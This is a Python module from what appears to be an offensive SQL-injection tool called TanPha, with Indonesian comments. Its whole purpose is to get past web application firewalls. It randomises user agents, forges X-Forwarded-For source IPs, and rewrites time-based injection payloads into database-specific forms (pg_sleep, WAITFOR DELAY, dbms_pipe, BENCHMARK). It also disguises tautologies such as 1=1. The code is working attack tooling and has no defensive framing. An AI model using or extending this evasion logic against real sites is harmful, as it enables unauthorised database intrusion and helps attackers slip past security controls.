"""WAF Evasion Engine V4 for TanPha V5. DB-Aware with Dynamic Regex Evasion."""
import random
import re
from network.config import EvasionLevel

class EvasionEngine:
    def __init__(self, level: EvasionLevel, db_type: str = "mysql"):
        self.level = level
        self.db_type = db_type.lower()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]
        # Regex buat nangkep SLEEP(detik) dengan angka dinamis
        # (?i) = case insensitive, \s* = toleran spasi, (\d+) = nangkep angka
        self.sleep_pattern = re.compile(r"(?i)SLEEP\s*\(\s*(\d+)\s*\)")

    def get_spoofed_headers(self) -> dict:
        headers = {}
        if self.level in (EvasionLevel.STANDARD, EvasionLevel.AGGRESSIVE):
            headers["User-Agent"] = random.choice(self.user_agents)
            headers["Accept-Language"] = "en-US,en;q=0.9"
            if self.level == EvasionLevel.AGGRESSIVE:
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return headers

    def obfuscate_payload(self, payload: str, attack_type: str = "sqli") -> str:
        if self.level == EvasionLevel.NONE:
            return payload

        if attack_type == "sqli":
            return self._semantic_sqli_evasion(payload)
        return payload

    def _semantic_sqli_evasion(self, payload: str) -> str:
        mutated = payload

        if self.level in (EvasionLevel.STANDARD, EvasionLevel.AGGRESSIVE):
            # 1. Time-Based Evasion (DB-Aware menggunakan Regex)
            # Ini bakal nangkep SLEEP(5), SLEEP(10), sleep(2), dll.
            if self.sleep_pattern.search(mutated):
                if self.db_type == "postgres":
                    # Postgres pake pg_sleep(n)
                    mutated = self.sleep_pattern.sub(r"pg_sleep(\1)", mutated)
                elif self.db_type == "mssql":
                    # MSSQL pake WAITFOR DELAY '0:0:n'
                    mutated = self.sleep_pattern.sub(r"WAITFOR DELAY '0:0:\1'", mutated)
                elif self.db_type == "oracle":
                    # Oracle pake dbms_pipe
                    mutated = self.sleep_pattern.sub(r"dbms_pipe.receive_message(('a'),\1)", mutated)
                else: 
                    # Default MySQL: BENCHMARK butuh nilai iterasi (bukan detik).
                    # Kita kali 10 juta biar delay-nya mirip dengan sleep(n) detik.
                    mutated = self.sleep_pattern.sub(r"BENCHMARK(\1 * 10000000, MD5(1))", mutated)

            # 2. Logic Bypass (Aggressive Only)
            if self.level == EvasionLevel.AGGRESSIVE:
                mutated = mutated.replace("1=1", "2>1")
                mutated = mutated.replace("1=2", "2<1")
                
        return mutated
